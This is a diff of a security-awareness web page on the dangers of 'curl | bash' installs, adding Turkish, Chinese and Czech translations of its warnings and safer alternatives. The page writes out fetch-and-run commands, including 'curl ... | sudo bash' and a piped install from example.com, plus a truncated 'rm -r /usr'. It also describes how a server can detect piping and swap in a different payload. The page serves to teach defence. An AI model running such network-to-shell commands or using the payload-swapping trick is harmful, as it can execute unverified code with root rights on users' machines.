-            <p>The pipe is live. Bash receives and executes lines as they arrive. Drop the connection mid-transfer and you get partial execution: a command like <code>rm -r /usr/share/program</code> can truncate to <code>rm -r /usr</code>. Commands ran, cleanup didn&#8217;t.</p>
+            <strong>Bash indirme tamamlanmadan ba&#351;lar</strong>
+            <p>Pipe canl&#305;d&#305;r. Bash, sat&#305;rlar&#305; geldik&#231;e al&#305;r ve &#231;al&#305;&#351;t&#305;r&#305;r. Aktar&#305;m ortas&#305;nda ba&#287;lant&#305;y&#305; keserseniz k&#305;smi y&#252;r&#252;tme elde edersiniz: <code>rm -r /usr/share/program</code> gibi bir komut <code>rm -r /usr</code> &#351;eklinde kesilebilir. Komutlar &#231;al&#305;&#351;t&#305;, temizlik &#231;al&#305;&#351;mad&#305;.</p>
           </div>
         </li>
         <li>
           <span class="icon">&#127917;</span>
           <div class="body">
-            <strong>The server knows you&#8217;re piping &#8212; and can lie</strong>
-            <p>Servers detect the curl User-Agent or use timing: send a <code>sleep</code> command early in the script &#8212; if bash is executing it, pipe reads pause, curl blocks, and the server observes the delay. Confirmed execution. Then serve a different payload. &#8220;I&#8217;ll read it in the browser first&#8221; doesn&#8217;t protect you: what you read is not what ran.</p>
+            <strong>Sunucu pipe kulland&#305;&#287;&#305;n&#305;z&#305; biliyor &#8212; ve yalan s&#246;yleyebilir</strong>
+            <p>Sunucular curl User-Agent&#8217;&#305; alg&#305;lar ya da zamanlama kullan&#305;r: beti&#287;in ba&#351;&#305;nda bir <code>sleep</code> komutu g&#246;nderir &#8212; bash bunu &#231;al&#305;&#351;t&#305;r&#305;yorsa pipe okumalar&#305; duraksatilir, curl bloke olur ve sunucu gecikmeyi g&#246;zlemler. &#199;al&#305;&#351;t&#305;rma do&#287;ruland&#305;. Ard&#305;ndan farkl&#305; bir payload sunar. &#8220;&#214;nce taray&#305;c&#305;da okuyaca&#287;&#305;m&#8221; sizi korumaz: okudu&#287;unuz, &#231;al&#305;&#351;anla ayn&#305; de&#287;ildir.</p>
           </div>
         </li>
         <li>
           <span class="icon">&#128274;</span>
           <div class="body">
-            <strong>No integrity verification</strong>
-            <p>No checksum, no signature. You trust DNS, TLS, the CDN, and the origin simultaneously. A compromised CDN or BGP hijack delivers malware silently.</p>
+            <strong>B&#252;t&#252;nl&#252;k do&#287;rulamas&#305; yok</strong>
+            <p>Sa&#287;lama toplam&#305; yok, imza yok. DNS, TLS, CDN ve kayna&#287;a ayn&#305; anda g&#252;veniyorsunuz. Ele ge&#231;irilmi&#351; bir CDN ya da BGP ele ge&#231;irmesi sessizce k&#246;t&#252; ama&#231;l&#305; yaz&#305;l&#305;m teslim eder.</p>
           </div>
         </li>
         <li>
           <span class="icon">&#128279;</span>
           <div class="body">
-            <strong>You trust more than you think</strong>
-            <p>Not just the author. You trust the domain registrar, DNS provider, CDN, hosting, every CI/CD pipeline that built the artifact, and every future maintainer who will ever push to that repo.</p>
+            <strong>D&#252;&#351;und&#252;&#287;&#252;n&#252;zden daha fazlas&#305;na g&#252;veniyorsunuz</strong>
+            <p>Sadece yazara de&#287;il. Alan ad&#305; kay&#305;t kurulu&#351;una, DNS sa&#287;lay&#305;c&#305;s&#305;na, CDN&#8217;e, bar&#305;nd&#305;rma hizmetine, artefakt&#305; olu&#351;turan her CI/CD pipeline&#8217;&#305;na ve o repoya gelecekte push yapacak her bak&#305;mc&#305;ya g&#252;veniyorsunuz.</p>
           </div>
         </li>
         <li>
           <span class="icon">&#128203;</span>
           <div class="body">
-            <strong>You can&#8217;t reproduce what ran</strong>
-            <p>The URL is live and mutable. No record exists of what exactly executed on your machine &#8212; only that something did.</p>
+            <strong>&#199;al&#305;&#351;an&#305; yeniden olu&#351;turamazs&#305;n&#305;z</strong>
+            <p>URL canl&#305; ve de&#287;i&#351;kendir. Makinenizde tam olarak neyin &#231;al&#305;&#351;t&#305;r&#305;ld&#305;&#287;&#305;na dair hi&#231;bir kay&#305;t yoktur &#8212; yaln&#305;zca bir &#351;eyin &#231;al&#305;&#351;t&#305;&#287;&#305; bilinir.</p>
           </div>
         </li>
         <li>
           <span class="icon">&#128273;</span>
           <div class="body">
-            <strong>Add <code>sudo</code> and it&#8217;s game over</strong>
-            <p><code>curl ... | sudo bash</code> grants root to whoever controls that URL at that moment. This pattern appears in real published docs. Often.</p>
+            <strong><code>sudo</code> ekleyin ve i&#351; biter</strong>
+            <p><code>curl ... | sudo bash</code>, o URL&#8217;yi o an kontrol eden ki&#351;iye root yetkisi verir. Bu kal&#305;p ger&#231;ek yay&#305;mlanm&#305;&#351; belgelerde g&#246;r&#252;n&#252;r. S&#305;kl&#305;kla.</p>
           </div>
         </li>
         </ul>
@@ -1835,33 +1835,33 @@
           <div class="example-header">
             <span class="tag danger">sudo</span>
             <span class="tag danger">no checksum</span>
-            <span class="tool">developer environment manager</span>
+            <span class="tool">geli&#351;tirici ortam y&#246;neticisi</span>
           </div>
-          <div class="example-body">Downloaded a binary to <strong>/usr/local/bin via sudo</strong> with no integrity check. If a required dependency wasn&#8217;t present, the script silently pulled in gigabytes of additional tooling. Also followed an undisclosed redirect chain between domains.</div>
+          <div class="example-body">B&#252;t&#252;nl&#252;k denetimi olmadan <strong>sudo arac&#305;l&#305;&#287;&#305;yla /usr/local/bin</strong> dizinine bir ikili dosya indirildi. Gerekli bir ba&#287;&#305;ml&#305;l&#305;k mevcut de&#287;ilse betik sessizce gigabaytlarca ek ara&#231; indirdi. Ayr&#305;ca etki alanlar&#305; aras&#305;nda a&#231;&#305;klanmam&#305;&#351; bir y&#246;nlendirme zincirine uydu.</div>
         </div>
         <div class="example">
           <div class="example-header">
             <span class="tag danger">live dev branch</span>
             <span class="tag danger">no checksum</span>
-            <span class="tool">cloud coding tool</span>
+            <span class="tool">bulut tabanl&#305; kodlama arac&#305;</span>
           </div>
-          <div class="example-body">The install URL silently redirected to a <strong>live dev branch on GitHub</strong> &#8212; no version tags, no pinning. Every commit to that branch changed what users got. What ran yesterday is not what runs today.</div>
+          <div class="example-body">Kurulum URL&#8217;si sessizce <strong>GitHub&#8217;daki canl&#305; bir geli&#351;tirme dal&#305;na</strong> y&#246;nlendirdi &#8212; s&#252;r&#252;m etiketi yok, sabitleme yok. O dala yap&#305;lan her commit, kullan&#305;c&#305;lar&#305;n ald&#305;&#287;&#305; &#351;eyi de&#287;i&#351;tirdi. D&#252;n &#231;al&#305;&#351;an bug&#252;n &#231;al&#305;&#351;anla ayn&#305; de&#287;il.</div>
         </div>
         <div class="example">
           <div class="example-header">
             <span class="tag warn">no checksum</span>
             <span class="tag warn">sudo possible</span>
-            <span class="tool">open-source AI agent</span>
+            <span class="tool">a&#231;&#305;k kaynakl&#305; AI ajan&#305;</span>
           </div>
-          <div class="example-body">Pulled in a Python runtime, a JavaScript runtime, and a full headless browser (~300&#8239;MB). May invoke sudo to install system packages. After removing the main directory, system-level traces remain.</div>
+          <div class="example-body">Bir Python &#231;al&#305;&#351;ma zaman&#305;, bir JavaScript &#231;al&#305;&#351;ma zaman&#305; ve tam bir ba&#351;s&#305;z taray&#305;c&#305; (~300&#8239;MB) indirildi. Sistem paketlerini y&#252;klemek i&#231;in sudo &#231;a&#287;&#305;rabilir. Ana dizin kald&#305;r&#305;ld&#305;ktan sonra sistem d&#252;zeyinde izler kal&#305;r.</div>
         </div>
         <div class="example">
           <div class="example-header">
             <span class="tag warn">closed CDN</span>
             <span class="tag warn">no checksum</span>
-            <span class="tool">code assistant from a major hardware vendor</span>
+            <span class="tool">b&#252;y&#252;k bir donan&#305;m &#252;reticisinden kod asistan&#305;</span>
           </div>
-          <div class="example-body">Downloads from a proprietary internal CDN with no public source history and no checksum. There is nothing to audit and no way to verify what you received.</div>
+          <div class="example-body">Kamuya a&#231;&#305;k kaynak ge&#231;mi&#351;i ve sa&#287;lama toplam&#305; olmayan tescilli bir dahili CDN&#8217;den indirir. Denetlenecek hi&#231;bir &#351;ey yoktur ve ald&#305;&#287;&#305;n&#305;z&#305; do&#287;rulaman&#305;n yolu yoktur.</div>
         </div>
         </div>
       </section>
@@ -1870,8 +1870,8 @@
         <h2>Bunun yerine yapılacaklar</h2>
         <div class="alternatives">
         <div class="alt">
-          <h3>1. Use a real package manager</h3>
-          <p>The boring option is usually the right one. Package managers handle integrity, updates, and uninstallation.</p>
+          <h3>1. Ger&#231;ek bir paket y&#246;neticisi kullan&#305;n</h3>
+          <p>S&#305;k&#305;c&#305; se&#231;enek genellikle do&#287;ru oland&#305;r. Paket y&#246;neticileri b&#252;t&#252;nl&#252;&#287;&#252;, g&#252;ncellemeleri ve kald&#305;rma i&#351;lemlerini y&#246;netir.</p>
           <div class="term">
   <span class="cmt"># macOS</span><br>
   <span class="prompt">$ </span><span class="cmd">brew install</span> <span class="url">sometool</span><br><br>
@@ -1882,8 +1882,8 @@
 </div>
         </div>
         <div class="alt">
-          <h3>2. Download, inspect, then run</h3>
-          <p>One extra step. Gives you a chance to read the script and keeps a local copy for future reference.</p>
+          <h3>2. &#304;ndirin, inceleyin, sonra &#231;al&#305;&#351;t&#305;r&#305;n</h3>
+          <p>Bir ad&#305;m fazla. Beti&#287;i okuma f&#305;rsat&#305; verir ve gelecekte ba&#351;vurmak i&#231;in yerel bir kopya tutar.</p>
           <div class="term">
   <span class="prompt">$ </span><span class="cmd">curl</span> <span class="flag">-fsSL</span> <span class="url">https://example.com/install.sh</span> <span class="flag">-o</span> <span class="url">install.sh</span><br>
   <span class="prompt">$ </span><span class="cmd">cat</span> <span class="url">install.sh</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="cmt"># actually read it</span><br>
@@ -1891,19 +1891,19 @@
 </div>
         </div>
         <div class="alt">
-          <h3>3. Log everything that executes</h3>
-          <p>If you must pipe &#8212; record what ran so you can audit or undo later.</p>
+          <h3>3. &#199;al&#305;&#351;t&#305;r&#305;lan her &#351;eyi kaydedin</h3>
+          <p>Pipe kullanmak zorundaysan&#305;z &#8212; ileride denetleyebilmek veya geri alabilmek i&#231;in &#231;al&#305;&#351;an&#305; kaydedin.</p>
           <div class="term">
   <span class="prompt">$ </span><span class="cmd">curl</span> <span class="flag">-fsSL</span> <span class="url">https://example.com/install.sh</span> <span class="pipe">|</span> <span class="cmd">bash -x</span> <span class="flag">2&gt;&amp;1</span> <span class="pipe">|</span> <span class="cmd">tee</span> <span class="url">install.log</span>
 </div>
           <div class="callout warn">
             <strong>Not</strong>
-            <code>bash -x</code> traces top-level commands only. Subprocesses and sourced scripts won&#8217;t appear in the log.
+            <code>bash -x</code> yaln&#305;zca &#252;st d&#252;zey komutlar&#305; izler. Alt s&#252;re&#231;ler ve kaynaklanan betikler g&#252;nl&#252;kte g&#246;r&#252;nmez.
           </div>
         </div>
         <div class="alt">
-          <h3>4. Verify the checksum</h3>
-          <p>If the project publishes a SHA-256 hash, use it. Non-negotiable on production machines.</p>
+          <h3>4. Sa&#287;lama toplam&#305;n&#305; do&#287;rulay&#305;n</h3>
+          <p>Proje bir SHA-256 karmas&#305; yay&#305;ml&#305;yorsa kullan&#305;n. &#220;retim makinelerinde tart&#305;&#351;mas&#305;z zorunludur.</p>
           <div class="term">
   <span class="prompt">$ </span><span class="cmd">curl</span> <span class="flag">-fsSL</span> <span class="url">https://example.com/install.sh</span> <span class="flag">-o</span> <span class="url">install.sh</span><br>
   <span class="prompt">$ </span><span class="cmd">echo</span> <span class="url">"abc123&#8230;expectedhash&nbsp;&nbsp;install.sh"</span> <span class="pipe">|</span> <span class="cmd">sha256sum -c</span><br>
@@ -1915,10 +1915,10 @@
       </section>
 
       <section>
-        <h2>Common Objection</h2>
+        <h2>Yayg&#305;n &#304;tiraz</h2>
         <div class="faq">
-          <p class="faq-q">&#8220;But I trust the vendor, so it&#8217;s fine, right?&#8221;</p>
-          <p class="faq-a">Trusting the vendor is necessary but not sufficient. <code>curl | bash</code> adds attack surface <em>on top of</em> that trust: you also trust DNS, the CDN, the hosting provider, and anyone who might compromise the URL between now and the moment you run it. A package installed through a package manager goes through additional verification layers. The vendor being reputable doesn&#8217;t make the delivery mechanism safe.</p>
+          <p class="faq-q">&#8220;Ama sa&#287;lay&#305;c&#305;ya g&#252;veniyorum, yani sorun yok, de&#287;il mi?&#8221;</p>
+          <p class="faq-a">Sa&#287;lay&#305;c&#305;ya g&#252;venmek gereklidir ama yeterli de&#287;ildir. `curl | bash`, bu g&#252;venin &#252;zerine ek sald&#305;r&#305; y&#252;zeyi ekler: ayn&#305; zamanda DNS&#8217;e, CDN&#8217;e, bar&#305;nd&#305;rma sa&#287;lay&#305;c&#305;s&#305;na ve URL&#8217;yi &#351;u an ile &#231;al&#305;&#351;t&#305;rd&#305;&#287;&#305;n&#305;z an aras&#305;nda ele ge&#231;irebilecek herkese g&#252;veniyorsunuz. Bir paket y&#246;neticisi arac&#305;l&#305;&#287;&#305;yla kurulan paket ek do&#287;rulama katmanlar&#305;ndan ge&#231;er. Sa&#287;lay&#305;c&#305;n&#305;n sayg&#305;n olmas&#305;, teslim mekanizmas&#305;n&#305; g&#252;venli k&#305;lmaz.</p>
         </div>
       </section>
 
@@ -1952,43 +1952,43 @@
         <li>
           <span class="icon">&#9889;</span>
           <div class="body">
-            <strong>Bash starts before the download finishes</strong>
-            <p>The pipe is live. Bash receives and executes lines as they arrive. Drop the connection mid-transfer and you get partial execution: a command like <code>rm -r /usr/share/program</code> can truncate to <code>rm -r /usr</code>. Commands ran, cleanup didn&#8217;t.</p>
+            <strong>Bash 在下载完成前就开始执行</strong>
+            <p>管道是实时的。Bash 在接收到每一行时就立即执行。如果在传输过程中断开连接：比如 <code>rm -r /usr/share/program</code> 这样的命令可能被截断为 <code>rm -r /usr</code>。命令已经执行，清理却没有完成。</p>
           </div>
         </li>
         <li>
           <span class="icon">&#127917;</span>
           <div class="body">
-            <strong>The server knows you&#8217;re piping &#8212; and can lie</strong>
-            <p>Servers detect the curl User-Agent or use timing: send a <code>sleep</code> command early in the script &#8212; if bash is executing it, pipe reads pause, curl blocks, and the server observes the delay. Confirmed execution. Then serve a different payload. &#8220;I&#8217;ll read it in the browser first&#8221; doesn&#8217;t protect you: what you read is not what ran.</p>
+            <strong>服务器知道你在使用管道——并且可以撒谎</strong>
+            <p>服务器可以检测 curl User-Agent，或通过时序判断：在脚本开头发送一个 <code>sleep</code> 命令——如果 bash 正在执行它，管道读取就会暂停，curl 被阻塞，服务器便能观察到这一延迟，从而确认命令正在执行。随后，服务器可以投递不同的载荷。「我先在浏览器里看一眼」并不能保护你：你看到的不是实际运行的。</p>
           </div>
         </li>
         <li>
           <span class="icon">&#128274;</span>
           <div class="body">
-            <strong>No integrity verification</strong>
-            <p>No checksum, no signature. You trust DNS, TLS, the CDN, and the origin simultaneously. A compromised CDN or BGP hijack delivers malware silently.</p>
+            <strong>没有完整性验证</strong>
+            <p>没有校验和，没有签名。你同时信任 DNS、TLS、CDN 和源服务器。被攻陷的 CDN 或 BGP 劫持会悄无声息地投递恶意软件。</p>
           </div>
         </li>
         <li>
           <span class="icon">&#128279;</span>
           <div class="body">
-            <strong>You trust more than you think</strong>
-            <p>Not just the author. You trust the domain registrar, DNS provider, CDN, hosting, every CI/CD pipeline that built the artifact, and every future maintainer who will ever push to that repo.</p>
+            <strong>你信任的远不止你以为的</strong>
+            <p>不只是作者。你还信任域名注册商、DNS 提供商、CDN、托管服务、构建该制品的每一条 CI/CD 流水线，以及未来所有会向该仓库推送代码的维护者。</p>
           </div>
         </li>
         <li>
           <span class="icon">&#128203;</span>
           <div class="body">
-            <strong>You can&#8217;t reproduce what ran</strong>
-            <p>The URL is live and mutable. No record exists of what exactly executed on your machine &#8212; only that something did.</p>
+            <strong>你无法复现到底运行了什么</strong>
+            <p>URL 是活跃且可变的。没有任何记录能说明你的机器上究竟执行了什么——只知道执行了某些东西。</p>
           </div>
         </li>
         <li>
           <span class="icon">&#128273;</span>
           <div class="body">
-            <strong>Add <code>sudo</code> and it&#8217;s game over</strong>
-            <p><code>curl ... | sudo bash</code> grants root to whoever controls that URL at that moment. This pattern appears in real published docs. Often.</p>
+            <strong>加上 <code>sudo</code>，彻底完了</strong>
+            <p><code>curl ... | sudo bash</code> 将 root 权限交给了在那一刻控制该 URL 的任何人。这种用法出现在真实发布的文档中。而且很常见。</p>
           </div>
         </li>
         </ul>
@@ -2002,33 +2002,33 @@
           <div class="example-header">
             <span class="tag danger">sudo</span>
             <span class="tag danger">no checksum</span>
-            <span class="tool">developer environment manager</span>
+            <span class="tool">开发环境管理器</span>
           </div>
-          <div class="example-body">Downloaded a binary to <strong>/usr/local/bin via sudo</strong> with no integrity check. If a required dependency wasn&#8217;t present, the script silently pulled in gigabytes of additional tooling. Also followed an undisclosed redirect chain between domains.</div>
+          <div class="example-body">通过 <strong>sudo 将二进制文件下载到 /usr/local/bin</strong>，没有任何完整性校验。如果所需依赖不存在，脚本会静默拉取数 GB 的额外工具。此外，还跟随了跨域名的未公开重定向链。</div>
         </div>
         <div class="example">
           <div class="example-header">
             <span class="tag danger">live dev branch</span>
             <span class="tag danger">no checksum</span>
-            <span class="tool">cloud coding tool</span>
+            <span class="tool">云端编程工具</span>
           </div>
-          <div class="example-body">The install URL silently redirected to a <strong>live dev branch on GitHub</strong> &#8212; no version tags, no pinning. Every commit to that branch changed what users got. What ran yesterday is not what runs today.</div>
+          <div class="example-body">安装 URL 静默重定向到 <strong>GitHub 上的一个活跃开发分支</strong>——没有版本标签，没有版本锁定。每次向该分支提交代码，用户获取到的内容就会改变。昨天运行的和今天运行的并不相同。</div>
         </div>
         <div class="example">
           <div class="example-header">
             <span class="tag warn">no checksum</span>
             <span class="tag warn">sudo possible</span>
-            <span class="tool">open-source AI agent</span>
+            <span class="tool">开源 AI 智能体</span>
           </div>
-          <div class="example-body">Pulled in a Python runtime, a JavaScript runtime, and a full headless browser (~300&#8239;MB). May invoke sudo to install system packages. After removing the main directory, system-level traces remain.</div>
+          <div class="example-body">下载了一个 Python 运行时、一个 JavaScript 运行时，以及完整的无头浏览器（约 300&#8239;MB）。可能会调用 sudo 安装系统软件包。删除主目录后，系统层面仍会残留痕迹。</div>
         </div>
         <div class="example">
           <div class="example-header">
             <span class="tag warn">closed CDN</span>
             <span class="tag warn">no checksum</span>
-            <span class="tool">code assistant from a major hardware vendor</span>
+            <span class="tool">某大型硬件厂商的代码助手</span>
           </div>
-          <div class="example-body">Downloads from a proprietary internal CDN with no public source history and no checksum. There is nothing to audit and no way to verify what you received.</div>
+          <div class="example-body">从专有的内部 CDN 下载，没有公开的源码历史，也没有校验和。无从审计，也无法验证你收到的内容。</div>
         </div>
         </div>
       </section>
@@ -2037,8 +2037,8 @@
         <h2>正确做法</h2>
         <div class="alternatives">
         <div class="alt">
-          <h3>1. Use a real package manager</h3>
-          <p>The boring option is usually the right one. Package managers handle integrity, updates, and uninstallation.</p>
+          <h3>1. 使用正规的包管理器</h3>
+          <p>无聊的选项通常才是正确的。包管理器负责处理完整性验证、更新和卸载。</p>
           <div class="term">
   <span class="cmt"># macOS</span><br>
   <span class="prompt">$ </span><span class="cmd">brew install</span> <span class="url">sometool</span><br><br>
@@ -2049,8 +2049,8 @@
 </div>
         </div>
         <div class="alt">
-          <h3>2. Download, inspect, then run</h3>
-          <p>One extra step. Gives you a chance to read the script and keeps a local copy for future reference.</p>
+          <h3>2. 下载、检查，再运行</h3>
+          <p>只需多一个步骤。给你机会阅读脚本，并保留一份本地副本供日后参考。</p>
           <div class="term">
   <span class="prompt">$ </span><span class="cmd">curl</span> <span class="flag">-fsSL</span> <span class="url">https://example.com/install.sh</span> <span class="flag">-o</span> <span class="url">install.sh</span><br>
   <span class="prompt">$ </span><span class="cmd">cat</span> <span class="url">install.sh</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="cmt"># actually read it</span><br>
@@ -2058,19 +2058,19 @@
 </div>
         </div>
         <div class="alt">
-          <h3>3. Log everything that executes</h3>
-          <p>If you must pipe &#8212; record what ran so you can audit or undo later.</p>
+          <h3>3. 记录所有执行内容</h3>
+          <p>如果你非用管道不可——记录下运行了什么，以便事后审计或撤销。</p>
           <div class="term">
   <span class="prompt">$ </span><span class="cmd">curl</span> <span class="flag">-fsSL</span> <span class="url">https://example.com/install.sh</span> <span class="pipe">|</span> <span class="cmd">bash -x</span> <span class="flag">2&gt;&amp;1</span> <span class="pipe">|</span> <span class="cmd">tee</span> <span class="url">install.log</span>
 </div>
           <div class="callout warn">
             <strong>注意</strong>
-            <code>bash -x</code> traces top-level commands only. Subprocesses and sourced scripts won&#8217;t appear in the log.
+            <code>bash -x</code> 只跟踪顶层命令。子进程和通过 source 引入的脚本不会出现在日志中。
           </div>
         </div>
         <div class="alt">
-          <h3>4. Verify the checksum</h3>
-          <p>If the project publishes a SHA-256 hash, use it. Non-negotiable on production machines.</p>
+          <h3>4. 验证校验和</h3>
+          <p>如果项目发布了 SHA-256 哈希值，请务必使用。在生产环境机器上这是不可妥协的要求。</p>
           <div class="term">
   <span class="prompt">$ </span><span class="cmd">curl</span> <span class="flag">-fsSL</span> <span class="url">https://example.com/install.sh</span> <span class="flag">-o</span> <span class="url">install.sh</span><br>
   <span class="prompt">$ </span><span class="cmd">echo</span> <span class="url">"abc123&#8230;expectedhash&nbsp;&nbsp;install.sh"</span> <span class="pipe">|</span> <span class="cmd">sha256sum -c</span><br>
@@ -2082,10 +2082,10 @@
       </section>
 
       <section>
-        <h2>Common Objection</h2>
+        <h2>常见质疑</h2>
         <div class="faq">
-          <p class="faq-q">&#8220;But I trust the vendor, so it&#8217;s fine, right?&#8221;</p>
-          <p class="faq-a">Trusting the vendor is necessary but not sufficient. <code>curl | bash</code> adds attack surface <em>on top of</em> that trust: you also trust DNS, the CDN, the hosting provider, and anyone who might compromise the URL between now and the moment you run it. A package installed through a package manager goes through additional verification layers. The vendor being reputable doesn&#8217;t make the delivery mechanism safe.</p>
+          <p class="faq-q">「但我信任这个厂商，所以没问题，对吧？」</p>
+          <p class="faq-a">信任厂商是必要条件，但并不充分。`curl | bash` 在这种信任之上叠加了额外的攻击面：你同时还信任 DNS、CDN、托管服务提供商，以及在你运行命令前的任意时刻可能危害该 URL 的任何人。通过包管理器安装的软件包会经过额外的验证层。厂商声誉良好，并不意味着交付机制本身是安全的。</p>
         </div>
       </section>
 
@@ -2119,43 +2119,43 @@
         <li>
           <span class="icon">&#9889;</span>
           <div class="body">
-            <strong>Bash starts before the download finishes</strong>
-            <p>The pipe is live. Bash receives and executes lines as they arrive. Drop the connection mid-transfer and you get partial execution: a command like <code>rm -r /usr/share/program</code> can truncate to <code>rm -r /usr</code>. Commands ran, cleanup didn&#8217;t.</p>
+            <strong>Bash se spustí díve, než se stahování dokončí</strong>
+            <p>Roura je živá. Bash přijímá a spouští řádky průběžně, jak přicházejí. Přerušte spojení uprostřed přenosu: příkaz jako <code>rm -r /usr/share/program</code> může být zkrácen na <code>rm -r /usr</code>. Příkazy proběhly, úklíd ne.</p>
           </div>
         </li>
         <li>
           <span class="icon">&#127917;</span>
           <div class="body">
-            <strong>The server knows you&#8217;re piping &#8212; and can lie</strong>
-            <p>Servers detect the curl User-Agent or use timing: send a <code>sleep</code> command early in the script &#8212; if bash is executing it, pipe reads pause, curl blocks, and the server observes the delay. Confirmed execution. Then serve a different payload. &#8220;I&#8217;ll read it in the browser first&#8221; doesn&#8217;t protect you: what you read is not what ran.</p>
+            <strong>Server ví, že používáte rouru — a může lžít</strong>
+            <p>Servery detekují curl User-Agent nebo používají měření času: pošlou příkaz <code>sleep</code> na začátku skriptu — pokud ho bash provádí, čtení z roury se pozastaví, curl zablokuje a server zaznaméná prodlevu. Provádění potvrzeno. Pak odešle jiný payload. ‚Nejdřív si to přečtu v prohlížeči‘ vás nechrání: to, co čtete, není to, co se spustilo.</p>
           </div>
         </li>
         <li>
           <span class="icon">&#128274;</span>
           <div class="body">
-            <strong>No integrity verification</strong>
-            <p>No checksum, no signature. You trust DNS, TLS, the CDN, and the origin simultaneously. A compromised CDN or BGP hijack delivers malware silently.</p>
+            <strong>Žádné ověření integrity</strong>
+            <p>Žádný kontrolní součet, žádný podpis. Zároveň důvěřujete DNS, TLS, CDN i zdrojovému serveru. Kompromitované CDN nebo BGP hijack doručí malware bez jediného varování.</p>
           </div>
         </li>
         <li>
           <span class="icon">&#128279;</span>
           <div class="body">
-            <strong>You trust more than you think</strong>
-            <p>Not just the author. You trust the domain registrar, DNS provider, CDN, hosting, every CI/CD pipeline that built the artifact, and every future maintainer who will ever push to that repo.</p>
+            <strong>Důvěřujete víc, než si myslíte</strong>
+            <p>Nejen autorovi. Důvěřujete registrátorovi domény, poskytovateli DNS, CDN, hostingu, každému CI/CD pipeline, který sestavil artefakt, a každému budoucímu správci, který kdy pushne do toho repozitáře.</p>
           </div>
         </li>
         <li>
           <span class="icon">&#128203;</span>
           <div class="body">
-            <strong>You can&#8217;t reproduce what ran</strong>
-            <p>The URL is live and mutable. No record exists of what exactly executed on your machine &#8212; only that something did.</p>
+            <strong>Nemůžete reprodukovat, co proběhlo</strong>
+            <p>URL je živá a proměnlivá. Neexistuje žádný záznam o tom, co přesně bylo spouštěno na vašem stroji — jen to, že něco bylo.</p>
           </div>
         </li>
         <li>
           <span class="icon">&#128273;</span>
           <div class="body">
-            <strong>Add <code>sudo</code> and it&#8217;s game over</strong>
-            <p><code>curl ... | sudo bash</code> grants root to whoever controls that URL at that moment. This pattern appears in real published docs. Often.</p>
+            <strong>Přidejte <code>sudo</code> a je po všem</strong>
+            <p><code>curl ... | sudo bash</code> udělí root přístup tomu, kdo v danou chvíli kontroluje tuto URL. Tento vzor se vyskytuje ve skutečných publikovaných dokumentacích. Často.</p>
           </div>
         </li>
         </ul>
@@ -2169,17 +2169,17 @@
           <div class="example-header">
             <span class="tag danger">sudo</span>
             <span class="tag danger">no checksum</span>
-            <span class="tool">developer environment manager</span>
+            <span class="tool">správce vývojového prostředí</span>
           </div>
-          <div class="example-body">Downloaded a binary to <strong>/usr/local/bin via sudo</strong> with no integrity check. If a required dependency wasn&#8217;t present, the script silently pulled in gigabytes of additional tooling. Also followed an undisclosed redirect chain between domains.</div>
+          <div class="example-body">Binar ní soubor byl stažen do <strong>/usr/local/bin přes sudo</strong> bez jakéhokoli ověření integrity. Pokud chěla požadovaná závislost, skript potichu stáhl gigabajty dalších nástrojů. Také sledoval nezveřejněný řetězec přesměrování mezi doménami.</div>
         </div>
         <div class="example">
           <div class="example-header">
             <span class="tag danger">live dev branch</span>
             <span class="tag danger">no checksum</span>
-            <span class="tool">cloud coding tool</span>
+            <span class="tool">cloudový nástroj pro kódování</span>
           </div>
-          <div class="example-body">The install URL silently redirected to a <strong>live dev branch on GitHub</strong> &#8212; no version tags, no pinning. Every commit to that branch changed what users got. What ran yesterday is not what runs today.</div>
+          <div class="example-body">Instalační URL potichu přesměrovala na <strong>živou vývojovou větev na GitHub</strong> — žádné verze tagů, žádné připnutí. Každý commit do této větve změnil to, co uživatelé dostali. Co se spustilo včera, není to, co se spouští dnes.</div>
         </div>
         <div class="example">
           <div class="example-header">
@@ -2187,15 +2187,15 @@
             <span class="tag warn">sudo possible</span>
             <span class="tool">open-source AI agent</span>
           </div>
-          <div class="example-body">Pulled in a Python runtime, a JavaScript runtime, and a full headless browser (~300&#8239;MB). May invoke sudo to install system packages. After removing the main directory, system-level traces remain.</div>
+          <div class="example-body">Stáhl Python runtime, JavaScript runtime a plný behlavý prohlížeč (~300 MB). Může volat sudo pro instalaci systémových balíčků. Po odstranění hlavního adresáře zůstávají stopy na úrovni systému.</div>
         </div>
         <div class="example">
           <div class="example-header">
             <span class="tag warn">closed CDN</span>
             <span class="tag warn">no checksum</span>
-            <span class="tool">code assistant from a major hardware vendor</span>
+            <span class="tool">kódový asistent od velkého výrobce hardwaru</span>
           </div>
-          <div class="example-body">Downloads from a proprietary internal CDN with no public source history and no checksum. There is nothing to audit and no way to verify what you received.</div>
+          <div class="example-body">Stáhá z proprietárního interního CDN bez veřejné historie zdrojového kódu a bez kontrolního součtu. Není co auditovat a není způsob, jak ověřit, co jste obdrželi.</div>
         </div>
         </div>
       </section>
@@ -2204,8 +2204,8 @@
         <h2>Udělejte to takto</h2>
         <div class="alternatives">
         <div class="alt">
-          <h3>1. Use a real package manager</h3>
-          <p>The boring option is usually the right one. Package managers handle integrity, updates, and uninstallation.</p>
+          <h3>1. Použijte skutečný správce balíčků</h3>
+          <p>Nudná možnost je obvykle ta správná. Správci balíčků se starají o integritu, aktualizace a odinstalaci.</p>
           <div class="term">
   <span class="cmt"># macOS</span><br>
   <span class="prompt">$ </span><span class="cmd">brew install</span> <span class="url">sometool</span><br><br>
@@ -2216,8 +2216,8 @@
 </div>
         </div>
         <div class="alt">
-          <h3>2. Download, inspect, then run</h3>
-          <p>One extra step. Gives you a chance to read the script and keeps a local copy for future reference.</p>
+          <h3>2. Stáhněte, zkontrolujte, pak spusťte</h3>
+          <p>Jeden krok navíc. Dá vám příležitost přečíst skript a uchová místní kopii pro budoucí referenci.</p>
           <div class="term">
   <span class="prompt">$ </span><span class="cmd">curl</span> <span class="flag">-fsSL</span> <span class="url">https://example.com/install.sh</span> <span class="flag">-o</span> <span class="url">install.sh</span><br>
   <span class="prompt">$ </span><span class="cmd">cat</span> <span class="url">install.sh</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="cmt"># actually read it</span><br>
@@ -2225,19 +2225,19 @@
 </div>
         </div>
         <div class="alt">
-          <h3>3. Log everything that executes</h3>
-          <p>If you must pipe &#8212; record what ran so you can audit or undo later.</p>
+          <h3>3. Zaznamenejte vše, co se spustí</h3>
